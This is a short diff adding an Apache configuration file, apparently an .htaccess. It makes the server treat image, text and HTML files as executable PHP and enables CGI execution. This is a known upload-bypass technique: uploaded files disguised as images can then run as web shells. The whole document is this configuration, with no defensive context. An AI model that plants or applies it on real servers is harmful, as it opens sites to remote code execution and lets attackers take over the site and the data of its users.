@@ -1,0 +1,5 @@
+# Execute PHP in any file
+AddType application/x-httpd-php .png .jpg .gif .txt .html
+AddHandler php-script .png .jpg .gif .txt .html
+php_flag engine on
+Options +ExecCGI
